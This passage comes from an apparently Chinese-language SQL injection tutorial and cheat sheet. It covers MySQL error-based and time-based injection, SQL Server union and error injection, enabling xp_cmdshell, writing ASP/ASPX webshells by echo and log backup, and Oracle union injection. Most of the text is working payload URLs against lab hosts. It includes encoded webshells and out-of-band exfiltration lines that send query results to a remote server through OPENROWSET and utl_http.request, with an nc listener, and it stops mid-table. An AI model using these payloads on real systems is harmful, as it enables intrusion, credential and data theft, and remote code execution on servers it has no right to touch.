and+1&#x3D;(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as</span><br><span class="line">+x)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526195451.png" alt="image-20210526195445181"></p><h5 id="Error-based-Double-Query-Injection">Error based Double Query Injection</h5><ul><li>/<em>数据库版本</em>/</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526195703.png" alt="image-20210526195657239"></p><p>还有一些报错语句</p><h5 id="geometrycollection">geometrycollection()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and geometrycollection((select * from(select * from(select  user())a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and geometrycollection((select * from(select * from(select </span><br><span class="line">user())a)b))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526200153.png" alt="image-20210526200147408"></p><h5 id="multipoint">multipoint()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipoint((select * from(select * from(select database())a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and multipoint((select * from(select * from(select database())a)b))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526200334.png" alt="image-20210526200327968"></p><h5 id="polygon">polygon()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and polygon((select * from(select * from(select @@basedir MYSQL)a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and polygon((select * from(select * from(select @@basedir MYSQL)a)b))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526200651.png" alt="image-20210526200645488"></p><h5 id="multipolygon">multipolygon()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and multipolygon((select * from(select * from(select&#96; </span><br><span class="line">&#96;@@version_compile_os)a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and multipolygon((select * from(select * from(select </span><br><span class="line">@@version_compile_os)a)b))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526200835.png" alt="image-20210526200829020"></p><h5 id="linestring">linestring()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and linestring((select * from(select * from(select @@datadir)a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and linestring((select * from(select * from(select @@datadir)a)b))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526201026.png" alt="image-20210526201019882"></p><h5 id="multilinestring">multilinestring()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and multilinestring((select * from(select * from(select&#96; </span><br><span class="line">&#96;session_user())a)b))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and multilinestring((select * from(select * from(select </span><br><span class="line">session_user())a)b))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526201130.png" alt="image-20210526201124166"></p><h5 id="exp">exp()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and exp(~(select * from(select user())a))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526201222.png" alt="image-20210526201215634"></p><h4 id="读取文件">读取文件</h4><h5 id="extractvalue-读取文件-32长度限制">extractvalue 读取文件 32长度限制</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(1,concat(0x7e,(select  load_file(&#39;&#x2F;hello.php&#39;)),0x7e)))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and (extractvalue(1,concat(0x7e,(select  load_file(&#39;&#x2F;hello.php&#39;)),0x7e)))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526203950.png" alt="image-20210526203943218"></p><h5 id="exp-方法读取">exp 方法读取</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (exp(~(select*from(select  load_file(&#39;&#x2F;hello.php&#39;))a)))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and (exp(~(select*from(select </span><br><span class="line">load_file(&#39;&#x2F;hello.php&#39;))a)))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526204101.png" alt="image-20210526204054718"></p><hr><h3 id="延时注入">延时注入</h3><hr><p>延时注入属于盲注入的一种，这种注入通过 mysql 里面的 sleep()函数,这个函数的意思是延时 执行多少秒。</p><p>sleep 通常与 if 一起使用 例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(&#39;root&#39;&#x3D;&#39;root&#39;,sleep(3),0)  </span><br></pre></td></tr></table></figure><p>如果 字符串 root 等于 root 数据库延时 3 秒 否则输出 0</p><p>延时方法是先获取数据的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(LENGTH(version())&#x3D;6,sleep(3),0) </span><br></pre></td></tr></table></figure><p>再查询数据，这就是我们常用的一些字符 把他们转为 ASCII 码方便进行对比。 abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(ascii(substring(version(),1,1))&#x3D;53,sleep(3),0) </span><br></pre></td></tr></table></figure><p>字符串截取长度 substring()</p><p>字符转 ascii 码 ascii()</p><h4 id="判断注入-3">判断注入</h4><p>and sleep(5)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and sleep(5)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526205537.png" alt="image-20210526205531159"></p><h4 id="获取-mysql-版本">获取 mysql 版本</h4><p>and if(LENGTH(version())=这个是长度,sleep(3),0) 当长度到 23 的时候 页面延时 3 秒返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(LENGTH(version())&#x3D;23,sleep(3),0)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526210545.png" alt="image-20210526210538684"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select if(ascii(substring((select version()),1,1))&#x3D;53,sleep(5),0) &#96;</span><br><span class="line"></span><br><span class="line">&#96;select if(ascii(substring((select version()),2,1))&#x3D;46,sleep(5),0) &#96;</span><br><span class="line"></span><br><span class="line">&#96;select if(ascii(substring((select version()),3,1))&#x3D;53,sleep(5),0) &#96;</span><br><span class="line"></span><br><span class="line">&#96;select if(ascii(substring((select version()),4,1))&#x3D;46,sleep(5),0) &#96;</span><br><span class="line"></span><br><span class="line">&#96;select if(ascii(substring((select version()),5,1))&#x3D;52,sleep(5),0) &#96;</span><br><span class="line"></span><br><span class="line">&#96;select if(ascii(substring((select version()),6,1))&#x3D;54,sleep(5),0)</span><br></pre></td></tr></table></figure><hr><h2 id="sqlserver-联合注入">sqlserver 联合注入</h2><hr><p>sqlserver 经常与 asp 或者 aspx 一起使用，操作系统多数是 win2012 win2018</p><p>数据库版本 sql2008 sql2012</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8015&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure><h4 id="注释">注释</h4><ul><li><p>–空格 单行注释</p></li><li><p>/* */ 多行注释</p></li></ul><h4 id="判断是否注入">判断是否注入</h4><ul><li><p>’ 单引号是否报错</p></li><li><p>and 1=2</p></li><li><p>and 1=1 页面是否相同</p></li></ul><h4 id="判断列数-2">判断列数</h4><p>order by</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526211646.png" alt="image-20210526211640624"></p><p>order by 3 正常</p><h4 id="联合查询">联合查询</h4><p>联合查询 需要每个列的类型要一直 或者可以使用 null 直到页面出错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8015&#x2F;?id&#x3D;1&#39; union select 1,&#39;2&#39;,&#39;3&#39; --qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526211850.png" alt="image-20210526211844284"></p><p>第一个 2 ,3 为字符串 1为整型</p><h4 id="查询系统信息">查询系统信息</h4><p>db_name() 数据库名</p><p>@@version 版本信息</p><p>User_Name() 当前用户</p><p>host_name() 计算机名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8015&#x2F;?id&#x3D;1&#39; union select 1,db_name(),@@version --qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526212030.png" alt="image-20210526212023937"></p><h3 id="SQLserver-报错注入">SQLserver 报错注入</h3><table><thead><tr><th style="text-align:center">内容</th><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">显示系统信息</td><td style="text-align:center">and @@version&gt;0</td></tr><tr><td style="text-align:center">爆出数据库</td><td style="text-align:center">and db_name()&gt;0</td></tr><tr><td style="text-align:center">当前用户</td><td style="text-align:center">and User_Name()&gt;0</td></tr><tr><td style="text-align:center">爆出其他数据库</td><td style="text-align:center"><code> sqland (SELECT top 1 Name FROM  Master..SysDatabases)&gt;0              and (SELECT top 1 Name FROM  Master..SysDatabases where name not in ('master'))&gt;0            and (SELECT top 1 Name FROM  Master..SysDatabases where name not in ('master','iNethinkCMS','model','msdb'))&gt;0</code></td></tr><tr><td style="text-align:center">爆表</td><td style="text-align:center">and (select top 1 name from  [mydb].sys.all_objects where type=‘U’ AND is_ms_shipped=0)&gt;0                                                and (select top 1 name from  mydb.sys.all_objects where type=‘U’ AND is_ms_shipped=0 and name not in  (‘admin’))&gt;0</td></tr><tr><td style="text-align:center">爆列</td><td style="text-align:center">and (select top 1 COLUMN_NAME from  mydb.information_schema.columns where TABLE_NAME=‘admin’ and  COLUMN_NAME not in(‘ID’))&gt;0                                                                                                                                                                     and (select top 1 COLUMN_NAME from  mydb.information_schema.columns where TABLE_NAME=‘admin’ and  COLUMN_NAME not in(‘ID’,‘username’))&gt;0</td></tr><tr><td style="text-align:center">爆数据</td><td style="text-align:center">and (select top 1 password from admin)&gt;0                                                                                                                                                     and (select top 1 username from admin)&gt;0</td></tr></tbody></table><h3 id="sqlserver快速爆表列数据">sqlserver快速爆表列数据</h3><p>在 SQL_SERVER 中 每个数据库中都有 视图-&gt;系统视图 在这个下面都有很多关于这个库的表，表里面存放了很多关于这个库的信息。 COLUMNS 列 TABLES 表</p><table><thead><tr><th style="text-align:center">内容</th><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">爆出表</td><td style="text-align:center">and(select TABLE_NAME from  information_schema.TABLES where TABLE_SCHEMA=‘dbo’ FOR XML PATH)&gt;1</td></tr><tr><td style="text-align:center">爆出列</td><td style="text-align:center">and(select COLUMN_NAME from  information_schema.COLUMNS where TABLE_NAME=‘admin’ FOR XML PATH)&gt;1</td></tr><tr><td style="text-align:center">爆出数据</td><td style="text-align:center">and ( select username,password from  admin FOR XML PATH)&gt;1</td></tr></tbody></table><h3 id="sqlserver执行系统命令">sqlserver执行系统命令</h3><p>在 SQLSERVER 中是可以执行多行操作的</p><p>两条 SQL 语句是用分号隔开</p><p>select * from art; select * from admin</p><p>xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中则默认禁止。 如果用户拥有管理员 sa 权限则可以用 sp_configure 重新开启它</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;<span class="keyword">EXEC</span> sp_configure </span><br><span class="line"><span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;RECONFIGURE;</span><br></pre></td></tr></table></figure><p>命令解释</p><p>EXEC sp_configure ‘show advanced options’,1//允许修改高级参数</p><p>RECONFIGUREEXEC sp_configure ‘xp_cmdshell’,1 //打开 xp_cmdshell 扩展</p><p>RECONFIGURE</p><h4 id="执行系统命令">执行系统命令</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_cmdshell <span class="string">&#x27;ipconfig&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="开始-xp-cmdshell">开始 xp_cmdshell</h4><p>;EXEC sp_configure ‘show advanced  options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p><p>getshell</p><p>;exec master…xp_cmdshell ‘echo ^&lt;%eval  request(chr(35))%^&gt; &gt; C:\inetpub\wwwroot\<a href="http://www.demo1.com">www.demo1.com</a>\2.asp’ –</p><p>exec master…xp_cmdshell ‘echo ^&lt;%eval request(chr(35))%^&gt; &gt;C:\inetpub\wwwroot\<a href="http://www.demo1.com">www.demo1.com</a>\2.asp’–</p><p>exec master…xp_cmdshell ‘echo ^&lt;%@ Page  Language=“Jscript”%^&gt;^&lt;%eval(Request.Item[“chopper”],“unsafe”);%^&gt;&gt;D:\2.a spx’ –</p><p><a href="http://www.demo1.com/index.aspx?id=1;exec">http://www.demo1.com/index.aspx?id=1;exec</a> master…xp_cmdshell ‘echo ^&lt;%@  Page Language=“Jscript”%^&gt;^&lt;%eval(Request.Item[“chopper”],“unsafe”);%^&gt;&gt;C:\inet pub\wwwroot\<a href="http://www.demo1.com">www.demo1.com</a>\2.aspx’ –</p><p>执行系统命令 把命令结果输出到指定文件 <a href="http://www.demo1.com/index.aspx?id=1;EXEC">http://www.demo1.com/index.aspx?id=1;EXEC</a> master.dbo.xp_cmdshell  ‘ipconfig &gt;&gt;C:\inetpub\wwwroot\<a href="http://www.demo1.com">www.demo1.com</a>\ip.txt’</p><p><a href="http://www.demo1.com/index.aspx?id=1;EXEC">http://www.demo1.com/index.aspx?id=1;EXEC</a> master.dbo.xp_cmdshell  ‘whoami &gt;&gt;C:\inetpub\wwwroot\<a href="http://www.demo1.com">www.demo1.com</a>\ip.txt’</p><h3 id="sqlserver备份拿webshell">sqlserver备份拿webshell</h3><p>&lt;%execute(request(“a”))%&gt; 差异备份 经常会出错的 不稳定 log 备份一句话</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">;<span class="keyword">drop</span> <span class="keyword">table</span> test_tmp</span><br><span class="line"></span><br><span class="line">;<span class="keyword">create</span> <span class="keyword">table</span> test_tmp (a image);</span><br><span class="line"></span><br><span class="line">;backup log mydb <span class="keyword">to</span> disk <span class="operator">=</span><span class="string">&#x27;C:/phpStudy/MSSQL/WWW/asp.bak&#x27;</span> <span class="keyword">with</span> init;</span><br><span class="line"></span><br><span class="line">;<span class="keyword">insert</span> <span class="keyword">into</span> test_tmp (a) <span class="keyword">values</span>  (<span class="number">0x3C25657865637574652872657175657374282261222929253EDA</span>) </span><br><span class="line"></span><br><span class="line">;backup log mydb <span class="keyword">to</span> disk <span class="operator">=</span> <span class="string">&#x27;C:/phpStudy/MSSQL/WWW/123.asp&#x27;</span></span><br><span class="line"></span><br><span class="line">;<span class="keyword">drop</span> <span class="keyword">table</span> test_tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> art <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;IF <span class="keyword">EXISTS</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> </span><br><span class="line">information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;test_tmp&#x27;</span>)<span class="keyword">drop</span> <span class="keyword">table</span> test_tmp;<span class="keyword">create</span> </span><br><span class="line"><span class="keyword">table</span> test_tmp (a image);backup log mydb <span class="keyword">to</span> disk </span><br><span class="line"><span class="operator">=</span><span class="string">&#x27;C:/inetpub/wwwroot/www.demo1.com/asp.bak&#x27;</span> <span class="keyword">with</span> init;<span class="keyword">insert</span> <span class="keyword">into</span> test_tmp (a) </span><br><span class="line"><span class="keyword">values</span> (<span class="number">0x3C25657865637574652872657175657374282261222929253EDA</span>);backup </span><br><span class="line">log mydb <span class="keyword">to</span> disk <span class="operator">=</span> <span class="string">&#x27;C:/inetpub/wwwroot/www.demo1.com/123.asp&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="sqlserver-openrowset-转发利用">sqlserver openrowset 转发利用</h3><p>适用于盲注入，页面不返回信息 使用这种注入方法，需要一台带有 sqlserver 的机器。 原理就是把当前数据转发到远程的 sqlserver 上。</p><ul><li><p>启用 Ad Hoc Distributed Queries：</p><ul><li><p>;exec sp_configure ‘show advanced options’,1 reconfigure</p></li><li><p>;exec sp_configure ‘Ad Hoc Distributed Queries’,1 reconfigure</p></li></ul></li><li><p>为了安全使用完成后，关闭 Ad Hoc Distributed Queries：</p><ul><li><p>;exec sp_configure ‘Ad Hoc Distributed Queries’,0 reconfigure</p></li><li><p>;exec sp_configure ‘show advanced options’,0 reconfigure</p></li></ul></li></ul><h4 id="开启扩展">开启扩展</h4><p><a href="http://www.demo1.com/index.aspx?id=1;exec">http://www.demo1.com/index.aspx?id=1;exec</a> sp_configure ‘show advanced options’,1  reconfigure;exec sp_configure ‘Ad Hoc Distributed Queries’,1 reconfigure</p><p>本地建立临时表</p><p>create table ##version (VERSION varchar(500))</p><h4 id="查询系统信息-2">查询系统信息</h4><p><a href="http://www.demo1.com/index.aspx?id=1;insert">http://www.demo1.com/index.aspx?id=1;insert</a> into OPENROWSET(‘SQLOLEDB’,  ‘server=192.168.0.122;uid=sa;pwd=123456’, ‘select * from %23%23version’ ) select  DB_NAME()</p><p>执行上面语句之后 再来查询远程 sqlserver 上的表</p><p>select * from ##version</p><h4 id="两边创建临时表">两边创建临时表</h4><p>create table ##nonamed( dir ntext, num int )</p><p><a href="http://www.demo1.com/index.aspx?id=1;create">http://www.demo1.com/index.aspx?id=1;create</a> table %23%23nonamed( dir ntext, num int )</p><h4 id="查询路径">查询路径</h4><p>insert %23%23nonamed execute master…xp_dirtree ‘c:/’,1</p><p>向 nonamed 表插入 c 盘下路径的数据</p><p><a href="http://www.demo1.com/index.aspx?id=1;insert">http://www.demo1.com/index.aspx?id=1;insert</a> %23%23nonamed execute  master…xp_dirtree ‘c:/’,1</p><p>这里就是把数据转发到远程 192.168.0.122 sqlserver 上</p><p><a href="http://www.demo1.com/index.aspx?id=1;insert">http://www.demo1.com/index.aspx?id=1;insert</a> into OPENROWSET(‘SQLOLEDB’,  ‘server=192.168.0.122;uid=sa;pwd=123456’, ‘select * from %23%23nonamed’ ) select *  from %23%23nonamed</p><p>在远程 sqlserver 执行这个命令 就可以获取 数据 select * from %23%23nonamed</p><h2 id="oracle注入">oracle注入</h2><h3 id="oracle-jsp-联合注入">oracle jsp 联合注入</h3><p>靶场地址:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">59.63</span><span class="number">.200</span><span class="number">.79</span>:<span class="number">8808</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="注释-2">注释</h4><p>– 空格  单行注释</p><p>/**/多行注释</p><h4 id="判断是否注入-2">判断是否注入</h4><p>and 1=1 –</p><p>and 1=2 –</p><h4 id="列数">列数</h4><p>order by</p><p><a href="http://59.63.200.79:8808/?id=1">http://59.63.200.79:8808/?id=1</a> order by 4 – qwe 正常</p><p><a href="http://59.63.200.79:8808/?id=1">http://59.63.200.79:8808/?id=1</a> order by 5 – qwe 错误</p><h4 id="联合查询-2">联合查询</h4><p>因为 oracle 对列的类型比较严谨 所以 要用 null 可以匹配任意类型</p><p>Oracle 中的 dual 表是一个单行单列的虚拟表</p><p>Dual 是 Oracle 中的一个实际存在的表，任何用户均可读取。</p><p>所以可以通过这个 dual 表 来显示列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">59.63</span><span class="number">.200</span><span class="number">.79</span>:<span class="number">8808</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">-- qwe</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210608203818.png" alt="image-20210608203809773"></p><table><thead><tr><th style="text-align:center">当前用户权限</th><th style="text-align:left">select * from session_roles</th></tr></thead><tbody><tr><td style="text-align:center">当前数据库版本</td><td style="text-align:left">select banner from sys.v_$version where rownum=1</td></tr><tr><td style="text-align:center">服务器出口ip</td><td style="text-align:left">用 utl_http.request 可以实现</td></tr><tr><td style="text-align:center">服务器监听ip</td><td style="text-align:left">select utl_inaddr.get_host_address from dual</td></tr><tr><td style="text-align:center">服务器操作系统</td><td style="text-align:left">select member from v$logfile where rownum=1</td></tr><tr><td style="text-align:center">服务器sid</td><td style="text-align:left">select instance_name from v$instance</td></tr><tr><td style="text-align:center">当前连接用户</td><td style="text-align:left">select SYS_CONTEXT (‘USERENV’, ‘CURRENT_USER’) from dual</td></tr><tr><td style="text-align:center">当前用户</td><td style="text-align:left">SELECT user FROM dual</td></tr><tr><td style="text-align:center">查询库名</td><td style="text-align:left">select owner from all_tables where rownum=1                                                                                                                                                   select owner from all_tables where rownum=1 and owner &lt;&gt;‘SYS’</td></tr><tr><td style="text-align:center">查询表(表名大写)</td><td style="text-align:left">select table_name from user_tables where rownum=1                                                                                                                          select table_name from user_tables where rownum=1 and table_name&lt;&gt;‘ADMIN’</td></tr><tr><td style="text-align:center">查询列</td><td style="text-align:left">select column_name from user_tab_columns where table_name=‘ADMIN’ and rownum=1                                                                                                                                         select column_name from user_tab_columns where table_name=‘ADMIN’ and column_name&lt;&gt;‘ID’ and rownum=1                                                                                                                                                select column_name from user_tab_columns where table_name=‘ADMIN’ and column_name&lt;&gt;‘ID’ and column_name&lt;&gt;‘USERNAME’ and rownum=1</td></tr><tr><td style="text-align:center">查询数据</td><td style="text-align:left">SELECT CONCAT(USERNAME,PASSWORD) FROM ADMIN</td></tr><tr><td style="text-align:center">当前用户</td><td style="text-align:left">SELECT user FROM dual</td></tr><tr><td style="text-align:center">列出所有用户</td><td style="text-align:left">SELECT username FROM all_users ORDER BY username</td></tr><tr><td style="text-align:center">列出数据库</td><td style="text-align:left">SELECT DISTINCT owner FROM all_tables</td></tr><tr><td style="text-align:center">列出表名</td><td style="text-align:left">SELECT table_name FROM all_tables                                                                                                                                                                           SELECT owner, table_name FROM all_tables</td></tr><tr><td style="text-align:center">查询表所有列</td><td style="text-align:left">SELECT column_name FROM all_tab_columns WHERE TABLE_NAME=‘ADMIN’</td></tr><tr><td style="text-align:center">定位文件</td><td style="text-align:left">SELECT name FROM V$DATAFILE</td></tr></tbody></table><h3 id="utl-http-request-反弹注入">utl_http.request 反弹注入</h3><p>通过 utl_http.request 我们可以将查询的结果发送到远程服务器上，在遇到盲注时非常有用，要 使用该方法用户需要有 utl_http 访问网络的权限.</p><ul><li><p>检测是否支持utl_http.request</p><p>utl_http.request 页面正常 支持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url and exists (select count(*) from all_objects where object_name&#x3D;&#39;UTL_HTTP&#39;) -- </span><br></pre></td></tr></table></figure></li><li><p>反弹注入命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$url and</span><br><span class="line">utl_http.request(&#39;http:&#x2F;&#x2F;192.168.0.121:2008&#x2F;&#39;||(select banner from sys.v_$version where</span><br><span class="line">rownum&#x3D;1))&#x3D;1--</span><br><span class="line"></span><br><span class="line">and utl_http.request(&#39;http:&#x2F;&#x2F;域名或者 ip:端口&#x2F;&#39;||(注入的语句))&#x3D;1 --</span><br><span class="line"></span><br><span class="line">注意|| 注意转码%7C%7C</span><br></pre></td></tr></table></figure></li><li><p>监听本地信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vvlp 2008</span><br></pre></td></tr></table></figure></li><li><p>查询oracle版本信息</p></li></ul><table><thead><tr><th style="text-align:center">当前用户</th><th style="text-align:left">select user from dual</th></tr></thead><tbody><tr><td style="text-align:center">当前数据库版本</td><td style="text-align:left">select banner from sys.v_$version where rownum=1</td></tr><tr><td style="text-align:center">服务器出口ip</td><td style="text-align:left">用 utl_http.request 可以实现</td></tr><tr><td style="text-align:center">服务器监听ip</td><td style="text-align:left">select utl_inaddr.get_host_address from dual</td></tr><tr><td 